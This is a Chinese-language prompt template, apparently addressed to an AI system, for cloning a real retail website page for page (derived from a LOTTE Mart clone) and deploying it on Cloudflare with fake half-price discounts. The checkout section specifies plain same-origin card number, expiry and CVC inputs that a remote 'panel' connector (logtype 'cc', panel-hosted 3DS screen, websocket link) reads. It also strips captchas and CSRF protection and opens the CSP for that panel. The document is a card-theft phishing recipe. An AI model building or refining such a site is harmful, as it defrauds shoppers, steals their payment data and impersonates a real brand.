# 扒站复刻项目 · 提示词模板

> 用法：新开一个会话，把下面 `---` 之间的内容整段贴进去，再把方括号里的占位替换成实际值。
> 这份模板是从「LOTTE Mart 全量复刻」项目里沉淀的，包含所有踩过的坑，照做一次过。

---

## 一、任务

把 **`[TARGET_SITE]`**（例如 `https://www.example.com/`）做成 1:1 复刻站，部署到 Cloudflare，并接入 `/bp` 结账接管契约。

**「1:1」的定义**：首页 / 分类页 / 商品页 / 专题页 / 静态内容页，每一页都是原站那一页的完整快照——不是模板填充、不是结构仿写。区块顺序、间距、字号、颜色、文案、图片尺寸、页脚信息全部来自原站。

**交付物**：
- 一个可访问的线上站点（R2 + Worker）
- 一份自检报告（下面第七节的清单，全绿）
- 代码仓库（含抓取/构建/校验脚本，可重跑）

---

## 二、结账页与面板契约

站点侧交付页 + 两个接口，面板侧交付 `/bp/*`。契约以 **`建站结账页契约.md`** 为唯一权威（随包附带，逐条照做，标 🔴 的不可协商）。

关键约束（摘要，细节以契约为准）：

**路由**
- 结账页固定 `/checkout`，接受尾斜杠，不 301
- 成功页 `/order/<order_number>`
- SPA 跳转只允许 `pushState(state, '', nextPath + location.search)`，初始化禁止 `history.replaceState(null,'','/')`（query 必须保留）
- `/bp/` 一律**绝对路径**引用，禁止 `./bp/`

**head 顺序（不能变）**
1. UTM 捕获脚本（同步内联，最先执行）
2. `window.__BP_CART__` 骨架（必须在 connector 之前存在）
3. `/bp/connector.css` + `/bp/connector.js`

**DOM**
- 卡片三字段：`#bp-card-number` `#bp-card-expiry` `#bp-card-cvc`，普通 `<input type="text">`，同源、不在 iframe、不用 Shadow DOM、不用 contenteditable
- `#bp-submit`：提交中**不 disabled**，用 `aria-busy` + 内部状态位
- `#bp-error`：常驻，默认空串，**不用 display:none**
- `#bp-total`：文本 = `data-amount`（整数最小货币单位）= `__BP_CART__.total_amount`，三者同源
- 卡片格式化**由 connector 负责**，站点不要自己写
- 表单不写 `action`；submit 由 connector 拦截，站点兜底也必须在 connector 之后注册且无条件 `preventDefault()`
- 给卡片字段区加 `.bp-card-fields` 容器（等待时 connector 会给它加 `.bp-veil`）

**数据**
- `window.__BP_CART__ = {order_number, currency, total(整数), total_amount(带符号串), items:[{name,qty,price}], locale}`，**原地 mutate**，绝不整体替换对象
- 金额整数、`total_amount` 与 `#bp-total` 文本完全一致
- `GET /api/cart` 与骨架同构；**必须读购物车 cookie 还原**（否则 connector 会把算好的金额冲成 0）
- 数据到位派发 `window.dispatchEvent(new CustomEvent('bp:cart-ready', {detail: c}))`

**提交**
- `POST /api/checkout`：永远 HTTP 200 + JSON，绝不 302/303，绝不返回 HTML
- 请求体**不含卡片数据**；返回的 `order_number` 必须等于请求里的
- 同一单号重复 POST 必须幂等
- 失败用 `{ok:false, error_code, message}`（站点原语言）
- 无验证码、无 CSRF nonce
- 兼容 connector 的 billing 字段名：`customer.name || firstname+lastname`、`customer.addr || address1`
- **守卫模式**：`guard_mode: "always"` + `allow_direct: false` 时，点提交只挂起，等面板 `r6` 才真正建单；站点不能有「点击后 N 秒自动跳转」或超时判失败

**CSP（方案 A）**
```
default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
img-src 'self' data: https:; font-src 'self' data: https:;
connect-src 'self' https://[PANEL_DOMAIN] wss://[PANEL_DOMAIN];
frame-src 'self' https://[PANEL_DOMAIN];
base-uri 'self'; form-action 'self'; object-src 'none'
```
🔴 `frame-src` **必须包含面板域名**——3DS 验证屏是面板托管的独立页面，写成只有 `'self'` 会白屏。
🔴 `script-src` 只保留 `'unsafe-inline'`，**绝不能同时出现 nonce-/sha256-**（会让 `unsafe-inline` 整体失效）。
🔴 不加 `sandbox`、不加 `require-trusted-types-for`、不发 `X-Frame-Options`。

**禁止清单**：第三方托管支付字段 / 卡片字段在跨域 iframe / Shadow DOM 包裹 / 页面自带 `<base>` / 注册 Service Worker / 验证码 / `/api/checkout` 返回 302 / 提交后换单号 / `./bp/` 相对路径 / 整体替换 `__BP_CART__` / 全局 `iframe{display:none}`。

---

## 三、价格与促销规则

**全站 5 折**（可指定折扣率），规则：

```
折后价 = round(原价 ÷ 2 ÷ 100) × 100      // 四舍五入到百位，十位个位固定 00
例：29500 → 14750 → 14800
```

- 以**显示原价**为基准；原站已有折扣的，删掉原折扣信息，只保留一组「划线原价 + 折后价 + 折扣标签」
- 必须同时改**数据层**（商品 JSON）和**HTML 层**（静态页面文本），不能只改一边
- **抓完新页面必须重跑价格管道**（这是最容易漏的一步）
- 生成幂等：始终读 `price`（原价）字段，不要读 `special_price`

**首页促销弹窗**（可选）：用提供的图片，倒计时到**目标国当天 24:00**。时区换算注意：`Date.now()` 已是 UTC 毫秒，直接 `+ 时区偏移` 后按 UTC 读，**不要**再叠加 `getTimezoneOffset()`。关闭后当天不再弹（写 localStorage 到当地当天结束）。

---

## 四、抓取与构建流程

**技术栈**：Playwright（真实 Chrome）+ Node 22+，零框架静态输出。

```
1. 探测        Playwright 打开目标站，存渲染后 DOM + 截图 + 资源清单
2. 找数据接口  抓 Network 里的 JSON API（商品列表 / 分类树 / banner），存在本地
3. 建 catalog  从 API 生成商品、分类、banner 映射（含桌面图↔手机图）
4. 全量抓页面  每个商品 / 每个分类各抓一份真实快照
5. 清理       删除所有 <script>、第三方 preconnect、noscript、弹窗节点；
              域名本地化；回填商品卡空图；YouTube iframe → 缩略图外链
6. 内联注入    head 里写死 UTM + __BP_CART__ 骨架（静态托管没有服务端注入）
7. 资源补全   递归扫所有 HTML 的 src/href/url()，缺什么下什么
8. 价格管道   数据层 + HTML 层同时改
9. 自建页     购物车 / 结账 / 成功 / 搜索 / 登录
10. 校验      跑第七节的清单
```

**关键实现要求**：

- 抓取要**断点续传**（已存在且体积正常就跳过），并发 8–10
- 单页等待：`goto` 后 700ms + 滚到底（步长 1400px）+ 350ms；**酒类/大页面**这类要等更久（2600ms + 慢滚 + 1200ms）
- 抓完必须扫**空壳页**（< 50KB 且无价格），单独重抓
- 补图脚本必须**递归子目录**（专题页在 `tp5/` 这类目录里，只扫根目录会整片灰）
- 清理时顺带修 **属性值里的换行**（`src="...\n.webp"` 会导致 404）

---

## 五、部署：Cloudflare R2 + Worker（推荐）

**不要用 Pages**：Pages 硬限制 20,000 个文件，14749 个商品页 + 34000 个资源装不下。

```
建 R2 bucket        POST /accounts/{id}/r2/buckets  {"name":"[BUCKET]"}
部署临时 uploader   Worker 接收 POST /upload?key=... 写 R2（用完删）
批量上传            并发 20，断点续传（先拉 /keys 比对）
部署正式 Worker     按路径从 R2 取文件 + 注入 CSP 头 + 内嵌 /api/*
```

Worker 路由要点：

```js
/                    → index.html
/cart /checkout …    → cart.html / checkout.html …
/order/<号>          → order.html
/vi-nsg/product/<slug>  → vi-nsg/product/<slug>.html     // 扁平文件，不要目录 index.html
/vi-nsg/category/<slug> → vi-nsg/category/<slug>.html
其他 /vi-nsg/xxx      → vi-nsg/xxx.html
其余                  → 原样取 key
```

**费用**：R2 免费额度 10 GB 存储 / 100 万写 / 1000 万读 / 出口免费。3.5 GB 的站永远在免费额度内，**账单 $0**。

**🔴 `_redirects`（如果用 Pages）绝不能把路径 200 重写到 `*.html`** —— Pages 的 clean-URL 会把 `/xxx.html` 308 回 `/xxx`，形成无限循环（`ERR_TOO_MANY_REDIRECTS`）。

---

## 六、必须避开的坑（都踩过）

| # | 坑 | 现象 | 正确做法 |
|---|---|---|---|
| 1 | 补图脚本不递归 | 专题页整片灰 | 递归扫所有子目录的 HTML |
| 2 | 抓完没重跑价格 | 列表卡 5 折、详情页原价 | 抓完必须跑价格管道 + 抽检 |
| 3 | 空壳页 | 27 KB 无内容（酒类居多） | 扫 <50KB 重抓，延长等待 |
| 4 | `/api/cart` 不读 cookie | connector 把金额冲成 0，提交被拒 | API 从 cookie 还原购物车 |
| 5 | 目录型页面 | 每次访问 308 补尾斜杠 | 用扁平 `<slug>.html` |
| 6 | `_redirects` 指向 .html | 无限重定向 | 让 Pages 自己做 clean URL |
| 7 | 变体页判定 | 以为串页了 | 原站 canonical 可能少一段，改判「页面含自己的 SKU」 |
| 8 | 缺货商品 | 无加购按钮被当 bug | 原站写「Tạm thời hết hàng」，断言要放行 |
| 9 | 时区倒计时 | 多算一个时区 | 只加目标时区偏移，不叠 getTimezoneOffset |
| 10 | 门店弹窗 | 挡住首屏 | 抓取后清理删节点 + clone.js 兜底关闭 |
| 11 | 商品卡图片 | 空 `<span>` 灰块 | 按 SKU 从商品数据填 `background-image` |
| 12 | 价格正则 | 把 `field-price-old` 当 `field-price` | 用 `(?!-)` 排除，且已含 `lbl-discount` 的跳过 |
| 13 | 面板域名 | 3DS 白屏 | CSP `frame-src` 必须放行面板域名 |
| 14 | 提交不跳转 | 以为坏了 | 守卫模式下等面板 `r6` 是正确行为 |

---

## 七、验收清单（交付前必须全绿）

**A. 页面真实度**
- [ ] 随机 25 个商品页：标题/主图/价格/加购按钮/详情 tab 都对，无破图
- [ ] 10 个分类页：有商品卡且图片已填，无空占位
- [ ] 同名多 SKU（变体）：每个变体 URL 打开后页面里能找到**自己的 SKU**
- [ ] 无空壳页（< 50 KB）
- [ ] 关键页全 200：首页 / 购物车 / 结账 / 搜索 / 登录 / 成功页 / 专题页 / 静态页

**B. 价格**
- [ ] 随机抽 30–40 个商品页：`现价 === round(原价÷2÷100)×100`，标签 `-50%`，末尾两位 `00`
- [ ] 列表卡与详情页价格一致

**C. 契约**
- [ ] `/bp/*` 全部 200（connector / css / config / socket.io / runtime / 3ds 图）
- [ ] head 里 UTM 与 `__BP_CART__` 都在 connector 之前
- [ ] 卡片三字段存在且 `type=text`
- [ ] `#bp-total` 三处同源
- [ ] `#bp-error` 常驻（`display != none`）
- [ ] 提交后按钮带 `bp-busy`、卡片区 `opacity 0.45`
- [ ] `/api/checkout` 返回 `{ok:true, order_number}` 且单号与请求相同
- [ ] CSP：`frame-src` 含面板域名、`connect-src` 含 wss、`script-src` 有 `unsafe-inline`、无 `X-Frame-Options`

**D. 流程**
- [ ] 首页加购 → 角标变化 → 购物车行数/金额正确 → 结账页金额一致 → 提交进入守卫等待
- [ ] UTM 从落地页到结账页全程保留

---

## 八、资源与凭证

- 目标站：`[TARGET_SITE]`
- 面板域名：`[PANEL_DOMAIN]`（形如 `wss://panel.example.com`，不能带 `/socket.io`）
- 面板 `logname`：`[LOGNAME]`、`logtype`：`cc`
- Cloudflare Account ID：`[ACCOUNT_ID]`
- Cloudflare API Token：权限 `Workers Scripts:Edit` + `Workers R2 Storage:Edit` + `Account Settings:Read`，TTL 7 天，用完即删
- 契约包：`bp-connector-YYYYMMDD.zip` + `建站结账页契约.md`

---

## 九、执行纪律

1. **先探测再动手**：不知道原站的真实 DOM / 接口 / 分页方式之前，不要写抓取逻辑
2. **每改一层就验一层**：改价格就抽检价格，改路由就 curl 每条路径，不攒到最后一起验
3. **抓取与改造分离，但必须串联**：抓完 → 改价 → 补图 → 内联注入 → 上传，顺序不能漏
4. **自检脚本要能重复跑**，并且断言要贴着原站的真实行为（缺货无按钮、变体可同内容），不要自己臆造规则
5. **临时资源用完即删**：uploader Worker、临时 token、`__probe` 测试对象
6. 遇到「看起来该有但没有」的元素，先去原站确认它本来有没有，再决定是不是 bug
